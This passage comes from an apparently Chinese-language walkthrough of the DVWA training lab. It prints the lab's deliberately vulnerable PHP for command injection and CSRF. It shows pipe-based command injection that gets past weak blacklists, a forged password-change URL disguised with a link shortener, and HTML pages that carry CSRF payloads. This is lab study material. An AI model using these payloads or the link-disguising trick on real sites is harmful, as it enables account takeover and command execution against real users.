<p><code>$data = $db-&gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );</code>: 创建一个 PDO 准备语句（prepared statement），该语句用于执行 SQL 查询。查询的目标是从名为 “users” 的表中选择 “failed_login” 和 “last_login” 列的值，条件是 “user” 列等于提供的参数 <code>:user</code>。<code>LIMIT 1</code> 确保只返回一行数据。</p>
<p><code>$data-&gt;bindParam( ':user', $user, PDO::PARAM_STR );</code>: 绑定参数 <code>:user</code>，这是一个占位符，与预备语句中的 <code>(:user)</code> 对应。将 <code>$user</code> 变量绑定到这个参数，并指定参数类型为字符串（<code>PDO::PARAM_STR</code>）。</p>
<p>之后便是执行该PDO语句，并获取返回结果中的每一行数据</p>
<p>之后如果返回结果中如果只有一行数据且登陆失败的值大于指定的登录失败的值（3）就进入if循环，根据注释，这代表着用户已经被锁定</p>
<pre><code class="hljs scss"><span class="hljs-comment">// 用户被锁定。注意，使用此方法可能导致用户枚举！</span>
<span class="hljs-comment">// echo "&lt;pre&gt;&lt;br /&gt;由于登录错误次数过多，此帐户已被锁定。&lt;/pre&gt;";</span>
<span class="hljs-comment">// 计算用户何时可以再次登录</span></code></pre>
<p>这里获取最后一次登录的时间，接着+15*60，也就是禁用15分钟，接着timenow获取当前时间，如果当前时间小于规定的禁用时间，则账户依旧处于被锁定的状态</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110193530543.png" alt="image-20240110193530543"></p>
<p>这里同上述一般，也是进入数据库查询用户输入的内容是否与其匹配</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110193703159.png" alt="image-20240110193703159"></p>
<p>这里说如果用户的内容在数据库中可以找到，并且用户未处于锁定状态，说明用户成功登录。进入if后，获取了到目前为止登陆失败的次数与上一次登录的时间。</p>
<p>然后判断登录次数是否大于网站限制的登录次数，如果超过了，则会提醒用户在此次登录之前，你的账号存在被暴力破解的危险。</p>
<p>然后重置登陆失败的次数为0（因为成功登陆了）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240110193957147.png" alt="image-20240110193957147"></p>
<p>这里是else语句，如果用户未能成功登录，则会将当前用户对应的登陆失败的次数+1。其实这里的代码逻辑应该是先看下部分在看上部分。</p>
<p>那由于这里对爆破次数做了限制：3次。这几乎断绝了我们破解成功的几率。</p>
<h1 id="0x02-command-injection">0x02 Command Injection</h1>
<h2 id="low">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Submit'</span> ]  ) ) {
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'ip'</span> ];

    <span class="hljs-comment">// Determine OS and execute the ping command.</span>
    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) {
        <span class="hljs-comment">// Windows</span>
        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  '</span> . <span class="hljs-variable">$target</span> );
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// *nix</span>
        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  -c 4 '</span> . <span class="hljs-variable">$target</span> );
    }

    <span class="hljs-comment">// Feedback for the end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$cmd}</span>&lt;/pre&gt;"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p><code>php_uname</code>：这里配合参数s，最终会返回运行次PHP环境的操作系统信息，看是否为Windows系统，根据系统的类别使用适配的ping用法。</p>
<p>这里显而易见没有对用户输入的ip参数做出有效的过滤，这意味着我们可以配合管道符进行命令执行。</p>
<p>由于这里我是Windows下的，我们先简单了解一下Windows下的管道符相关用法：</p>
<blockquote>
<ul>
<li>“|”前面需要正确，然后显示后面语句的执行结果</li>
<li>“||”如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假</li>
<li>“&amp;”如果前面的语句为假则直接执行后面的语句，前面的语句为真则依次执行</li>
<li>“&amp;&amp;”如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真</li>
</ul>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111200110274.png" alt="image-20240111200110274"></p>
<p>这里我们可以配合|管道符进行命令执行，如上图所示，我们dir成功看到当前目录信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111200208094.png" alt="image-20240111200208094"></p>
<p>当然也可以进行文件读取</p>
<h2 id="medium">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Submit'</span> ]  ) ) {
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'ip'</span> ];

    <span class="hljs-comment">// Set blacklist</span>
    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(
        <span class="hljs-string">'&amp;&amp;'</span> =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,
    );

    <span class="hljs-comment">// Remove any of the characters in the array (blacklist).</span>
    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-title function_ invoke__">array_keys</span>( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );

    <span class="hljs-comment">// Determine OS and execute the ping command.</span>
    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) {
        <span class="hljs-comment">// Windows</span>
        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  '</span> . <span class="hljs-variable">$target</span> );
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// *nix</span>
        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  -c 4 '</span> . <span class="hljs-variable">$target</span> );
    }

    <span class="hljs-comment">// Feedback for the end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$cmd}</span>&lt;/pre&gt;"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里上一个level最大的不同就在于，设置了黑名单并且过滤了&amp;&amp;与;分号，不过这并不影响我们，因为这里过滤并不全，我们依旧可以向上一关一样进行文件读取等命令执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111200443528.png" alt="image-20240111200443528"></p>
<h2 id="high">High</h2>
<pre><code class="hljs php">
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Submit'</span> ]  ) ) {
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'ip'</span> ]);
    <span class="hljs-comment">// Set blacklist</span>
    <span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(
        <span class="hljs-string">'&amp;'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">';'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'| '</span> =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'-'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'$'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'('</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">')'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'`'</span>  =&gt; <span class="hljs-string">''</span>,
        <span class="hljs-string">'||'</span> =&gt; <span class="hljs-string">''</span>,
    );
    <span class="hljs-comment">// Remove any of the characters in the array (blacklist).</span>
    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-title function_ invoke__">array_keys</span>( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );

    <span class="hljs-comment">// Determine OS and execute the ping command.</span>
    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) {
        <span class="hljs-comment">// Windows</span>
        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  '</span> . <span class="hljs-variable">$target</span> );
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// *nix</span>
        <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  -c 4 '</span> . <span class="hljs-variable">$target</span> );
    }

    <span class="hljs-comment">// Feedback for the end user</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$cmd}</span>&lt;/pre&gt;"</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p><code>trim</code>：trim — 去除字符串首尾处的空白字符（或者其他字符）</p>
<p>如上所示，这串代码先用trim去除了IP参数内容的空格等字符，随后用更加严格的黑名单进行了过滤。虽然看着很全，但仔细观察会发现，其对|的过滤实际上是这样的<code>| </code>附加了一个空格，这估计是模拟现实中开发人员的失误。这意味着我们使用|依旧可以命令执行</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111201008732.png" alt="image-20240111201008732"></p>
<h2 id="impossible">Impossible</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Submit'</span> ]  ) ) {
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'user_token'</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );

    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">'ip'</span> ];
    <span class="hljs-variable">$target</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$target</span> );<span class="hljs-comment">//去除反斜杠\字符</span>

    <span class="hljs-comment">// Split the IP into 4 octects</span>
    <span class="hljs-variable">$octet</span> = <span class="hljs-title function_ invoke__">explode</span>( <span class="hljs-string">"."</span>, <span class="hljs-variable">$target</span> );<span class="hljs-comment">//将IP使用.符号分隔开</span>
    <span class="hljs-comment">// Check IF each octet is an integer</span>
    <span class="hljs-comment">//这里限制死了IP的每一段都需要为整数，且整个IP只能有四个网段</span>
    <span class="hljs-keyword">if</span>( ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">is_numeric</span>( <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>] ) ) &amp;&amp; ( <span class="hljs-title function_ invoke__">sizeof</span>( <span class="hljs-variable">$octet</span> ) == <span class="hljs-number">4</span> ) ) {
        <span class="hljs-comment">// If all 4 octets are int's put the IP back together.</span>
        <span class="hljs-variable">$target</span> = <span class="hljs-variable">$octet</span>[<span class="hljs-number">0</span>] . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">1</span>] . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">2</span>] . <span class="hljs-string">'.'</span> . <span class="hljs-variable">$octet</span>[<span class="hljs-number">3</span>];

        <span class="hljs-comment">// Determine OS and execute the ping command.</span>
        <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stristr</span>( <span class="hljs-title function_ invoke__">php_uname</span>( <span class="hljs-string">'s'</span> ), <span class="hljs-string">'Windows NT'</span> ) ) {
            <span class="hljs-comment">// Windows</span>
            <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  '</span> . <span class="hljs-variable">$target</span> );
        }
        <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// *nix</span>
            <span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">shell_exec</span>( <span class="hljs-string">'ping  -c 4 '</span> . <span class="hljs-variable">$target</span> );
        }

        <span class="hljs-comment">// Feedback for the end user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$cmd}</span>&lt;/pre&gt;"</span>;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Ops. Let the user name theres a mistake</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;'</span>;
    }
}
<span class="hljs-comment">// Generate Anti-CSRF token</span>
<span class="hljs-title function_ invoke__">generateSessionToken</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>如上所示，这里先是判断用户令牌，防止了CSRF攻击，接着去除了IP参数的反斜杠字符，然后将IP内容以点号分隔开，分别判断得到的数组每一位数组元素是否为整数，且整个数组长度只能为4，否则将被视为无效IP。</p>
<p>这种就是白名单过滤的方式了，只要不符合正确的IP格式，则抛出错误，这里我们是无法绕过的。</p>
<h1 id="0x03-csrf">0x03 CSRF</h1>
<h2 id="low">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'Change'</span> ] ) ) {
    <span class="hljs-comment">// Get input</span>
    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'password_new'</span> ];
    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'password_conf'</span> ];

    <span class="hljs-comment">// Do the passwords match?</span>
    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) {
        <span class="hljs-comment">// They do!</span>
        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );

        <span class="hljs-comment">// Update the database</span>
        <span class="hljs-variable">$insert</span> = <span class="hljs-string">"UPDATE `users` SET password = '<span class="hljs-subst">$pass_new</span>' WHERE user = '"</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">"';"</span>;
        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );

        <span class="hljs-comment">// Feedback for the user</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Issue with passwords matching</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;
    }

    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里直接对用户输入的密码判断是否在两次输入中相等，如果相等，就直接更新密码，并没有对访问来源等做出限制</p>
<p>很明显这里并不能有效的阻止CSRF的存在，如果用户访问我们精心构造的恶意链接，就会造成CSRF，造成恶意代码执行。攻击思路如下：</p>
<pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/vulnerabilities/csrf/?password_new=<span class="hljs-number">123456</span>&amp;password_conf=<span class="hljs-number">123456</span>&amp;Change=Change&amp;user_token=<span class="hljs-number">6</span>cfafc0462102ccd10970a2c8e8fa780#</code></pre>
<p>如果用户在当前网站访问上述链接，那就会执行密码修改的功能。倘若这时候我们知道了用户名，则我们可以成功冒充用户登录。当然如果对方有点防范意识的话，就不会点击上述很明显可疑的网址，那我们先搞一个简单的短网址来攻击。</p>
<p>在线工具：<a target="_blank" rel="noopener" href="https://tool.chinaz.com/tools/dwz.aspx">https://tool.chinaz.com/tools/dwz.aspx</a></p>
<p>生成如下：<a target="_blank" rel="noopener" href="http://i7q.cn/5UMMrV">http://i7q.cn/5UMMrV</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111203914143.png" alt="image-20240111203914143"></p>
<p>可以看到成功伪造</p>
<h3 id="配合xss">配合XSS</h3>
<p>这种 XSS 和 CSRF 结合成功率很高，攻击更加隐蔽。首先新建一个带有 xss 攻击语句的 html 页面，内容如下：</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSS&amp;CSRF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change&amp;user_token=6cfafc0462102ccd10970a2c8e8fa780#"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>当受害者访问含有这个html代码的页面的时候，用户的密码就被恶意修改了。</p>
<p>核心语句就是通过 <code>scirpt</code> 标签的 src 属性来记载攻击 payload 的 URL。当然还可以使用iframe、img等标签</p>
<h2 id="medium">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'Change'</span> ] ) ) {
    <span class="hljs-comment">// Checks to see where the request came from</span>
    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stripos</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">'HTTP_REFERER'</span> ] ,<span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">'SERVER_NAME'</span> ]) !== <span class="hljs-literal">false</span> ) {
        <span class="hljs-comment">// Get input</span>
        <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'password_new'</span> ];
        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'password_conf'</span> ];
        <span class="hljs-comment">// Do the passwords match?</span>
        <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) {
            <span class="hljs-comment">// They do!</span>
            <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$pass_new</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="hljs-string">""</span> : <span class="hljs-string">""</span>));
            <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );

            <span class="hljs-comment">// Update the database</span>
            <span class="hljs-variable">$insert</span> = <span class="hljs-string">"UPDATE `users` SET password = '<span class="hljs-subst">$pass_new</span>' WHERE user = '"</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">"';"</span>;
            <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">'&lt;pre&gt;'</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">'&lt;/pre&gt;'</span> );

            <span class="hljs-comment">// Feedback for the user</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;
        }
        <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// Issue with passwords matching</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;
        }
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Didn't come from a trusted source</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;
    }

    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>关键代码如下</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">stripos</span>( <span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">'HTTP_REFERER'</span> ] ,<span class="hljs-variable">$_SERVER</span>[ <span class="hljs-string">'SERVER_NAME'</span> ]) !== <span class="hljs-literal">false</span> )</code></pre>
<ol>
<li><code>$_SERVER[ 'HTTP_REFERER' ]</code>: 这是一个 HTTP 请求头，它包含了当前请求的来源页面的 URL。</li>
<li><code>$_SERVER[ 'SERVER_NAME' ]</code>: 这是当前服务器的主机名。</li>
</ol>
<p>这里判断用户访问该网站的来源地址是否与网站的host相同，如果不相同这说明来源有问题。如果一致，则认为是真正的用户，接着更新密码，同时拒绝了SQL注入。同时这关放弃了token的检验</p>
<p>这里就是考察我们对于<code>stripos</code>的理解了，由于该函数只是判断待查询字符串是否<strong>包含</strong>指定的字符，这意味着我们造构造恶意网址的时候，只需要在网址中包含与正确网站的host_name相同的部分即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111205025972.png" alt="image-20240111205025972"></p>
<p>首先精心构造一个HTML页面</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">from</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"get"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"csrf"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password_new"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password_conf"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span>
